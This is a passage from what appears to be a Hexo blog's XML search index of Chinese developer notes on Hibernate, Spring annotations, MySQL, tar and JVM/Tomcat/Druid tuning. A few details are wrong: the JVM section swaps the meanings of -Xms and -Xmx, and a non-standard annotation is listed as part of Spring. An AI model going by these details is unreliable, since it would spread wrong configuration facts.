id="Hibernate-对-Java-和-MySQL-的映射关系"><a href="#Hibernate-对-Java-和-MySQL-的映射关系" class="headerlink" title="Hibernate 对 Java 和 MySQL 的映射关系"></a>Hibernate 对 Java 和 MySQL 的映射关系</h2>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate 主键生成策略</title>
      <link href="/hibernate/hibernate/hibernate-id/"/>
      <url>/hibernate/hibernate/hibernate-id/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-JPA-生成策略"><a href="#使用-JPA-生成策略" class="headerlink" title="使用 JPA 生成策略"></a>使用 JPA 生成策略</h2><p>在实体中使用 @GeneratedValue 即可生成</p><pre><code>public class Role implements Serializable {    @Id    @GeneratedValue(strategy = GenerationType.IDENTITY)    private Long id;}</code></pre><p>JPA 标准中默认支持四种策略</p><ul><li>TABLE //使用一个额外的数据库表来保存主键</li><li>SEQUENCE //使用序列的方式，且其底层数据库要支持序列，一般有postgres、Oracle等</li><li>IDENTITY //主键由数据库生成，一般为自增型主键，支持的有MySql和Sql Server</li><li>AUTO //由程序来决定主键规则</li></ul><p>如果不指定策略，默认为 AUTO</p><h2 id="Hibernate-内置策略"><a href="#Hibernate-内置策略" class="headerlink" title="Hibernate 内置策略"></a>Hibernate 内置策略</h2><p>除了 JPA 标准策略之外 Hibernate 还有很多其他策略。可以在实体类中定义一个生成器。然后再 GeneratedValue 注解中使用即可。</p><pre><code>@Entity@Table(name = &quot;ip_user&quot;)@GenericGenerator(name = &quot;jpa-uuid&quot;, strategy = &quot;uuid&quot;)public class User  implements Serializable {    @Id    @GeneratedValue(generator = &quot;jpa-uuid&quot;)    @Column(length = 32)    private String userId;    ...}</code></pre><p>在 Hibernate 源码中，DefaultIdentifierGeneratorFactory 注册了大量的生成器。</p><pre><code> public DefaultIdentifierGeneratorFactory() {        register( &quot;uuid2&quot;, UUIDGenerator.class );        register( &quot;guid&quot;, GUIDGenerator.class );            // can be done with UUIDGenerator + strategy        register( &quot;uuid&quot;, UUIDHexGenerator.class );         // &quot;deprecated&quot; for new use        register( &quot;uuid.hex&quot;, UUIDHexGenerator.class );     // uuid.hex is deprecated        register( &quot;assigned&quot;, Assigned.class );        register( &quot;identity&quot;, IdentityGenerator.class );        register( &quot;select&quot;, SelectGenerator.class );        register( &quot;sequence&quot;, SequenceStyleGenerator.class );        register( &quot;seqhilo&quot;, SequenceHiLoGenerator.class );        register( &quot;increment&quot;, IncrementGenerator.class );        register( &quot;foreign&quot;, ForeignGenerator.class );        register( &quot;sequence-identity&quot;, SequenceIdentityGenerator.class );        register( &quot;enhanced-sequence&quot;, SequenceStyleGenerator.class );        register( &quot;enhanced-table&quot;, TableGenerator.class );    }    public void register(String strategy, Class generatorClass) {        LOG.debugf( &quot;Registering IdentifierGenerator strategy [%s] -&gt; [%s]&quot;, strategy, generatorClass.getName() );        final Class previous = generatorStrategyToClassNameMap.put( strategy, generatorClass );        if ( previous != null ) {            LOG.debugf( &quot;    - overriding [%s]&quot;, previous.getName() );        }    }</code></pre><p>常用的说明</p><h3 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h3><p>采用 128位的uuid算法生成主键，uuid被编码为一个32位16进制数字的字符串。<br>当使用strategy为uuid时，使用的时hibernate自己定义的UUID生成算法，此策略已过时，其具体实现参照org.hibernate.id. UUIDHexGenerator, 生成的字符串如402880876359adeb016359ae27190000<br>当使用strategy为uuid2时，此为此版本推荐使用的uuid生成算法，其默认采用标准的生成策略StandardRandomStrategy，实现为使用jdk自带的uuid生成方法，生成的字符串如<br>4af17c8e-8317-43e9-aff9-12d5590a71c6</p><h3 id="assigned"><a href="#assigned" class="headerlink" title="assigned"></a>assigned</h3><p>插入主键时，由程序来指定。相当于JPA中的AUTO。</p><h3 id="guid"><a href="#guid" class="headerlink" title="guid"></a>guid</h3><p>采用数据库底层的guid算法机制，对应MYSQL的uuid()函数，SQL Server的newid()函数，ORACLE的rawtohex(sys_guid())函数等</p>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用断言写法</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/assert-basic/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/assert-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="基本断言写法"><a href="#基本断言写法" class="headerlink" title="基本断言写法"></a>基本断言写法</h2><p>使用 assertEquals</p><pre><code>assertEquals(roleResponse.getName(), &quot;new_super_admin&quot;);</code></pre><p>使用 assertThat 配合 result matcher 实现</p><pre><code>assertThat(roleResponse.getCreateAt(), isA(Timestamp.class));</code></pre><h2 id="使用-assertJ-中的BDD写法"><a href="#使用-assertJ-中的BDD写法" class="headerlink" title="使用 assertJ 中的BDD写法"></a>使用 assertJ 中的BDD写法</h2><p>使用 hasSize 和 contains 方法</p><pre><code>assertThat(customers).hasSize(3).contains(customer1, customer2, customer3);</code></pre><p>使用 equalTo 方法</p><pre><code>assertThat(foundCustomer).isEqualTo(customer2);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 基础</title>
      <link href="/Spring/spring/spring-basic/"/>
      <url>/Spring/spring/spring-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-项目组成"><a href="#Spring-项目组成" class="headerlink" title="Spring 项目组成"></a>Spring 项目组成</h2><p>Spring 是一个开源框架，是为了解决企业应用程序开发复杂性而创建的（替代更加重量级的企业级Java技术， 尤其是EJB），它完成了大量开发中的通用步骤，留给开发者的仅仅是与特定应用相关的部分，从而大大提高了企业应用的开发效率。</p><p>Spring 框架是一个分层架构，由 7 个定义良好的模块组成。Spring 模块构建在核心容器之上，核心容器定义了创建、配置和管理 bean 的方式如下图：</p><p><img src="/Spring/spring/spring-basic/spring-architecture.gif" alt=""></p><p>每个模块的功能: </p><ul><li>Spring 核心容器：核心容器提供 Spring 框架的基本功能，管理着Spring应用中bean的创建、配置和管理。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用DI将应用程序的配置和依赖性规范与实际的应用程序代码分开。</li><li>Spring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。提供了一种框架式的对象访问方法，有些象JNDI注册器。Context封装包的特性得自于Beans封装包，并添加了对国际化（I18N）的支持（例如资源绑定），事件传播，资源装载的方式和Context的透明创建，比如说通过Servlet容器。Spring 上下文和Bean工厂都是 bean 容器 的实现。</li><li>Spring AOP：通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。</li><li>Spring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。</li><li>Spring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。</li><li>Spring Web 模块：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。</li><li>Spring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。</li></ul><h2 id="Spring-常用注解"><a href="#Spring-常用注解" class="headerlink" title="Spring 常用注解"></a>Spring 常用注解</h2><h3 id="声明-bean-注解类"><a href="#声明-bean-注解类" class="headerlink" title="声明 bean  注解类"></a>声明 bean  注解类</h3><ul><li><p>@Component 组件，没有明确的角色</p></li><li><p>@Service 在业务逻辑层使用（service层）</p></li><li><p>@Repository 在数据访问层使用（dao层）</p></li><li><p>@Controller 在展现层使用，控制器的声明（C）</p></li></ul><h3 id="注入bean的注解"><a href="#注入bean的注解" class="headerlink" title="注入bean的注解"></a>注入bean的注解</h3><ul><li><p>@Autowired：由Spring提供，推荐使用，一般来说很难把 Spring 换掉</p></li><li><p>@Inject：由JSR-330提供</p></li><li><p>@Resource：由JSR-250提供</p></li></ul><h3 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h3><ul><li>@Configuration 声明当前类为配置类，相当于xml形式的Spring配置（类上）,在 Spring 内部为 full configuration 加载，会继续加载声明在内部的 @Bean 注解</li><li>@Bean 注解在方法上，声明当前方法的返回值为一个bean，Spring 内部只会加载这个注解的类本身，内部不会继续加载</li><li>@ComponentScan 包扫描，扫描指定路径下的 bean</li><li>@WishlyConfiguration 为@Configuration与@ComponentScan的组合注解</li></ul><h3 id="Bean-相关"><a href="#Bean-相关" class="headerlink" title="@Bean 相关"></a>@Bean 相关</h3><ul><li>@Scope 设置Spring容器如何新建Bean实例</li><li>@PostConstruct Bean的初始话方法</li><li>@PreDestory 销毁</li></ul><p>scope 列表：</p><ul><li>Singleton （单例,一个Spring容器中只有一个bean实例，默认模式）</li><li>Protetype （每次调用新建一个bean）</li><li>Request （web项目中，给每个http request新建一个bean）</li><li>Session （web项目中，给每个http session新建一个bean）</li><li>GlobalSession（给每一个 global http session新建一个Bean实例）</li></ul><h3 id="Value注解"><a href="#Value注解" class="headerlink" title="@Value注解"></a>@Value注解</h3><p>支持 EL 表达式的属性注入</p><p>@Value(“${server.port}”)<br>private long port;</p><h3 id="加载配置类"><a href="#加载配置类" class="headerlink" title="加载配置类"></a>加载配置类</h3><ul><li>@PropertySource</li></ul><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><ul><li>@Profile 通过设定Environment的ActiveProfiles来设定当前context需要使用的配置环境。（类或方法上）,Profile 支持多个</li><li>@Conditional Spring4中可以使用此注解定义条件话的bean，通过实现Condition接口，并重写matches方法，从而决定该bean是否被实例化。（方法上）</li></ul><h3 id="异步相关"><a href="#异步相关" class="headerlink" title="异步相关"></a>异步相关</h3><ul><li>@EnableAsync 配置类中，通过此注解开启对异步任务的支持</li><li>@Async 在实际执行的bean方法使用该注解来申明其是一个异步任务</li></ul><h3 id="定时任务相关"><a href="#定时任务相关" class="headerlink" title="定时任务相关"></a>定时任务相关</h3><ul><li>@EnableScheduling 在配置类上使用，开启计划任务的支持</li><li>@Scheduled 来申明这是一个任务，包括cron,fixDelay,fixRate等类型（方法上，需先开启计划任务的支持）</li></ul><h3 id="Enable-相关"><a href="#Enable-相关" class="headerlink" title="@Enable 相关"></a>@Enable 相关</h3><ul><li>@EnableAspectJAutoProxy 开启对AspectJ自动代理的支持</li><li>@EnableAsync 开启异步方法的支持</li><li>@EnableScheduling 开启计划任务的支持</li><li>@EnableWebMvc 开启Web MVC的配置支持</li><li>@EnableConfigurationProperties 开启对@ConfigurationProperties注解配置Bean的支持</li><li>@EnableJpaRepositories 开启对SpringData JPA Repository的支持</li><li>@EnableTransactionManagement 开启注解式事务的支持</li><li>@EnableCaching 开启注解式的缓存支持</li></ul><h3 id="Spring-mvc"><a href="#Spring-mvc" class="headerlink" title="Spring mvc"></a>Spring mvc</h3><ul><li>@EnableWebMvc 在配置类中开启Web MVC的配置支持，如一些ViewResolver或者MessageConverter等，若无此句，重写WebMvcConfigurerAdapter方法（用于对SpringMVC的配置</li><li>@Controller 声明该类为SpringMVC中的Controller</li><li>@RequestMapping 用于映射Web请求，包括访问路径和参数（类或方法上）</li><li>@ResponseBody 支持将返回值放在response内，而不是一个页面，通常用户返回json数据（返回值旁或方法上）</li><li>@PathVariable 用于接收路径参数</li><li>@RestController 该注解为一个组合注解，相当于@Controller和@ResponseBody的组合</li><li>@ControllerAdvice 通过该注解，我们可以将对于控制器的全局配置放置在同一个位置</li><li>@Controller的类的方法可使用@ExceptionHandler、@InitBinder、@ModelAttribute注解到方法上</li><li>@ExceptionHandler 用于全局处理控制器里的异常</li><li>@InitBinder 用来设置WebDataBinder，WebDataBinder用来自动绑定前台请求参数到Model中，使用 RESTful API 用不到这些</li><li>@ModelAttribute 本来的作用是绑定键值对到Model里，在@ControllerAdvice中是让全局的</li></ul><h3 id="单元测试相关"><a href="#单元测试相关" class="headerlink" title="单元测试相关"></a>单元测试相关</h3><ul><li>@RunWith 运行器，Spring中通常用于对JUnit的支持</li><li>@ContextConfiguration 用来加载配置ApplicationContext，其中classes属性用来加载配置类</li></ul><h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><ul><li>超哥源码解析 <a href="https://study.163.com/course/courseLearn.htm?courseId=1209427892#/learn/video?lessonId=1279668587&amp;courseId=1209427892" target="_blank" rel="noopener">https://study.163.com/course/courseLearn.htm?courseId=1209427892#/learn/video?lessonId=1279668587&amp;courseId=1209427892</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 常见性能优化方法</title>
      <link href="/mysql/mysql/mysql-optimization/"/>
      <url>/mysql/mysql/mysql-optimization/</url>
      
        <content type="html"><![CDATA[<h2 id="优化子查询"><a href="#优化子查询" class="headerlink" title="优化子查询"></a>优化子查询</h2><p>子查询的性能是非常差的，可以优化为 select 子句。</p><p>优化前</p><pre><code>update clear_res set candelete=0 where resid in( select distinct resourceid from att_attentionresult where important=0);</code></pre><p>优化后</p><pre><code> update clear_res set candelete=0 where resid in(  select resourceid from (    select distinct resourceid from att_attentionresult where important=0  ) as tmp);</code></pre>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 中 Jackson 的常用技巧</title>
      <link href="/Spring/spring/jackson/"/>
      <url>/Spring/spring/jackson/</url>
      
        <content type="html"><![CDATA[<h2 id="格式化输出时间"><a href="#格式化输出时间" class="headerlink" title="格式化输出时间"></a>格式化输出时间</h2><pre><code>@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>编程效率提升技巧</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/effective/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/effective/</url>
      
        <content type="html"><![CDATA[<h2 id="调整-Mac-键盘响应速度"><a href="#调整-Mac-键盘响应速度" class="headerlink" title="调整 Mac 键盘响应速度"></a>调整 Mac 键盘响应速度</h2><p><img src="/职业素质/profession/effective/mac-keyboard-setting.png" alt=""></p><p>通过调整这几个设置，让删除、移动的速度大大提高，编程手速快速提升。</p><h2 id="自动补全左侧代码"><a href="#自动补全左侧代码" class="headerlink" title="自动补全左侧代码"></a>自动补全左侧代码</h2><p>例如 userRepository.save() 补全返回的结果</p><p>使用 alt + 两次 enter 即可实现自动补全。</p><h2 id="清除控制台"><a href="#清除控制台" class="headerlink" title="清除控制台"></a>清除控制台</h2><p>command + K</p><h2 id="可以提高效率的-IntelliJ-的快捷键"><a href="#可以提高效率的-IntelliJ-的快捷键" class="headerlink" title="可以提高效率的 IntelliJ 的快捷键"></a>可以提高效率的 IntelliJ 的快捷键</h2><p>显示最近的文件</p><p>command E</p><p>选中当前文本<br>command W</p><p>返回代码上一处<br>Command+ Alt + 左右键</p><p>查看类图</p><p>option+command+U</p>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MySQL DML 相关</title>
      <link href="/mysql/mysql/mysql-dml/"/>
      <url>/mysql/mysql/mysql-dml/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL-建表的一些细节"><a href="#MySQL-建表的一些细节" class="headerlink" title="MySQL 建表的一些细节"></a>MySQL 建表的一些细节</h2><pre><code>CREATE TABLE `role`  (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `readable_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT &#39;可读名称&#39;,  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT &#39;名称&#39;,  `remark` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT &#39;备注&#39;,  `create_at` datetime NULL DEFAULT NULL,  `update_at` datetime NULL DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</code></pre><ul><li>ENGINE 使用 InnoDB</li><li>ROW_FORMAT，Compact行记录是在MySQL 5.0时被引入的，其设计目标是能高效存放数据。简单来说，如果一个页中存放的行数据越多，其性能就越高。</li><li>CHARACTER SET 为 utf8</li><li>COLLATE 排序使用 utf8_general_ci</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 各种 join 的区别</title>
      <link href="/mysql/mysql/mysql-join/"/>
      <url>/mysql/mysql/mysql-join/</url>
      
        <content type="html"><![CDATA[<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><pre><code>SELECT * FROM `spring-boot-boilerplate`.user,department where department.id = user.department_id;CREATE TABLE `department` (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `name` varchar(255) NOT NULL,  `pid` bigint(20) NOT NULL COMMENT &#39;parent department&#39;,  `enabled` bit(1) NOT NULL,  `createAt` datetime DEFAULT NULL,  `updateAt` datetime DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT;CREATE TABLE `user` (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `avatar_id` bigint(20) DEFAULT NULL COMMENT &#39;头像资源&#39;,  `email` varchar(255) DEFAULT NULL COMMENT &#39;邮箱&#39;,  `enabled` bit(1) DEFAULT NULL COMMENT &#39;状态&#39;,  `password` varchar(255) DEFAULT NULL COMMENT &#39;密码&#39;,  `username` varchar(255) DEFAULT NULL COMMENT &#39;用户名&#39;,  `department_id` bigint(20) DEFAULT NULL,  `phone` varchar(255) DEFAULT NULL,  `createAt` datetime DEFAULT NULL,  `updateAt` datetime DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE,  UNIQUE KEY `unique_email` (`email`) USING BTREE,  UNIQUE KEY `unique_username` (`username`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT;</code></pre><h2 id="inner-join-和自然连接"><a href="#inner-join-和自然连接" class="headerlink" title="inner join  和自然连接"></a>inner join  和自然连接</h2><pre><code>SELECT * FROM `spring-boot-boilerplate`.user,department where department.id = user.department_id;</code></pre><p>这种是自然连接，和 join、inner join 效果一样。需要两张表都有数据，结果是两张表的集。</p><h2 id="left-join"><a href="#left-join" class="headerlink" title="left join"></a>left join</h2><h2 id="right-join"><a href="#right-join" class="headerlink" title="right join"></a>right join</h2><p><img src="/mysql/mysql/mysql-join/diagram.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 趟坑集合</title>
      <link href="/java/java/java-pitfalls/"/>
      <url>/java/java/java-pitfalls/</url>
      
        <content type="html"><![CDATA[<ul><li>基本数据类型的转换细节</li><li>浮点数比较精度丢失</li><li>短路运算符，后面有可能不执行</li><li>集合的 remove 操作</li><li>形参如果是一个方法会被执行</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>电商领域知识</title>
      <link href="/%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/domain/e-commerce/"/>
      <url>/%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/domain/e-commerce/</url>
      
        <content type="html"><![CDATA[<h2 id="电商数据库设计"><a href="#电商数据库设计" class="headerlink" title="电商数据库设计"></a>电商数据库设计</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1164332" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1164332</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 领域知识 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 时间相关数据类型</title>
      <link href="/java/java/java-time/"/>
      <url>/java/java/java-time/</url>
      
        <content type="html"><![CDATA[<p>## </p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring Bean validation 最佳实践</title>
      <link href="/Spring/spring/spring-bean-validation/"/>
      <url>/Spring/spring/spring-bean-validation/</url>
      
        <content type="html"><![CDATA[<h2 id="Validated-和-Valid-区别"><a href="#Validated-和-Valid-区别" class="headerlink" title="@Validated 和 @Valid 区别"></a>@Validated 和 @Valid 区别</h2><ul><li><p>@Validated：用在方法入参上无法单独提供嵌套验证功能。不能用在成员属性（字段）上，也无法提示框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p></li><li><p>@Valid：用在方法入参上无法单独提供嵌套验证功能。能够用在成员属性（字段）上，提示验证框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p></li></ul><p>Spring Validation验证框架对参数的验证机制提供了@Validated（Spring’s JSR-303规范，是标准JSR-303的一个变种），javax提供了@Valid（标准JSR-303规范），配合BindingResult可以直接提供参数验证结果。</p><p>推荐使用 @Valid，如果需要嵌套验证也需要增加 @Valid 注解。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码审查的注意事项中文版</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips-cn/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips-cn/</url>
      
        <content type="html"><![CDATA[<h2 id="通用事项"><a href="#通用事项" class="headerlink" title="通用事项"></a>通用事项</h2><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>和生产环境相关的注意事项</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/aware-product/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/aware-product/</url>
      
        <content type="html"><![CDATA[<h2 id="线上配置"><a href="#线上配置" class="headerlink" title="线上配置"></a>线上配置</h2><ul><li>每个应用使用自己的用户</li><li>开启防火墙</li><li>开启服务器监控</li><li>确保开启日志</li><li>合理设置安全组，关闭不常用的端口<ul><li>iptables 设置</li><li>firewall 设置</li></ul></li><li>设置合理的 jvm 参数</li><li>设置合理的线程数</li><li>设置合理的数据库连接数</li><li>设置合理的时区</li><li>合理的日志输出<ul><li>数据库日志</li><li>错误信息日志</li><li>第三方API调用日志</li></ul></li><li>常见异常的处理</li><li>系统监控</li><li>密匙管理</li></ul><h2 id="前端产品注意事项"><a href="#前端产品注意事项" class="headerlink" title="前端产品注意事项"></a>前端产品注意事项</h2><ul><li>gzip</li><li>js 压缩和混淆</li></ul><h2 id="使用-docker"><a href="#使用-docker" class="headerlink" title="使用 docker"></a>使用 docker</h2><ul><li>使用合理的基础镜像，减少大小 （shim alphine）</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>开启 bin-log 复制</li><li>设置合理的时区</li><li>设置合理的字符集</li><li>设置合理的存储引擎</li><li>有合理的唯一健和索引</li><li>视情况使用的外键，高并发的场景不建议使用外键</li><li>对 UUID 采用合理的索引</li><li>考虑数据迁移的便利性</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安装 openJdk 到 ubuntu 14</title>
      <link href="/linux/linux/linux-ubuntu-java/"/>
      <url>/linux/linux/linux-ubuntu-java/</url>
      
        <content type="html"><![CDATA[<pre><code>sudo add-apt-repository ppa:openjdk-r/ppasudo apt-get updatesudo apt-get install openjdk-8-jdksudo update-alternatives --config javasudo update-alternatives --config javac</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Tar 命令</title>
      <link href="/linux/linux/linux-tar/"/>
      <url>/linux/linux/linux-tar/</url>
      
        <content type="html"><![CDATA[<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>解压最常见的 gzip 压缩的 tar 包</p><blockquote><p> tar -xvzf abc.tar.gz -C /opt/folder/</p></blockquote><p>列出包内容</p><blockquote><p>tar -tz -f abc.tar.gz</p></blockquote><pre><code>./new/./new/cde.txt./new/subdir/./new/subdir/in.txt./new/abc.txt...</code></pre><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>创建一个 tar 包</p><blockquote><p>tar -cvf abc.tar ./new/</p></blockquote><p>创建一个 tar.gz 包</p><blockquote><p>tar -cvzf abc.tar.gz ./new/</p></blockquote><p>添加文件到已经存在的包</p><blockquote><p>tar -rv -f abc.tar abc.txt</p></blockquote><p>一条简单的备份脚本</p><blockquote><p>tar -cvz -f archive-$(date +%Y%m%d).tar.gz ./new/</p></blockquote><p>创建包时候，验证压缩包是否有效（特别有用）</p><blockquote><p>tar -cvW -f abc.tar ./new/</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>高并发和性能优化</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/concurrence-design/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/concurrence-design/</url>
      
        <content type="html"><![CDATA[<h2 id="架构优化"><a href="#架构优化" class="headerlink" title="架构优化"></a>架构优化</h2><ul><li>缓存<ul><li>redis</li><li>ehcache</li><li>memecache</li></ul></li><li>负载均衡</li><li>MQ</li><li>异步模型<ul><li>webflux</li><li>Nodejs</li></ul></li></ul><h2 id="后端并发"><a href="#后端并发" class="headerlink" title="后端并发"></a>后端并发</h2><ul><li>web 服务器<ul><li>使用undertow</li><li></li></ul></li></ul><h2 id="前端页面并发优化"><a href="#前端页面并发优化" class="headerlink" title="前端页面并发优化"></a>前端页面并发优化</h2><ul><li>Cookie 优化</li><li>CDN </li><li>图标聚合</li><li>开启 Gzip 压缩</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>读写分离</li><li>数据分片</li><li>分库分表</li></ul><h2 id="并发验证"><a href="#并发验证" class="headerlink" title="并发验证"></a>并发验证</h2><ul><li>k6</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常见线上调优参数和性能优化</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-parameters/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-parameters/</url>
      
        <content type="html"><![CDATA[<h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><pre><code>#最大连接数server.tomcat.max-connections=200#最大线程数server.tomcat.max-threads=300#编码方式server.tomcat.uri-encoding=UTF-8#post提交数据最大大小，设置为0不限制server.tomcat.max-http-post-size=0</code></pre><h2 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h2><pre><code>nohup java -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -Xms1024m -Xmx1024m -Xmn256m -Xss256k -XX:SurvivorRatio=8 -XX:+UseConcMarkSweepGC -jar xxx.jar-XX:MetaspaceSize=128m （元空间默认大小）-XX:MaxMetaspaceSize=128m （元空间最大大小）-Xms1024m （堆最大大小）-Xmx1024m （堆默认大小）-Xmn256m （新生代大小）-Xss256k （棧最大深度大小）-XX:SurvivorRatio=8 （新生代分区比例 8:2）-XX:+UseConcMarkSweepGC （指定使用的垃圾收集器，这里使用CMS收集器）</code></pre><h2 id="druid-数据库连接信息"><a href="#druid-数据库连接信息" class="headerlink" title="druid 数据库连接信息"></a>druid 数据库连接信息</h2><pre><code>spring:  datasource:    druid:      type: com.alibaba.druid.pool.DruidDataSource      driverClassName: net.sf.log4jdbc.sql.jdbcapi.DriverSpy      url: jdbc:log4jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;useSSL=false      username: root      password: 123456      # 初始化配置      initial-size: 3      # 最小连接数      min-idle: 3      # 最大连接数      max-active: 15      # 获取连接超时时间      max-wait: 5000      # 连接有效性检测时间      time-between-eviction-runs-millis: 90000      # 最大空闲时间      min-evictable-idle-time-millis: 1800000      test-while-idle: true      test-on-borrow: false      test-on-return: false      validation-query: select 1</code></pre><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/31803182" target="_blank" 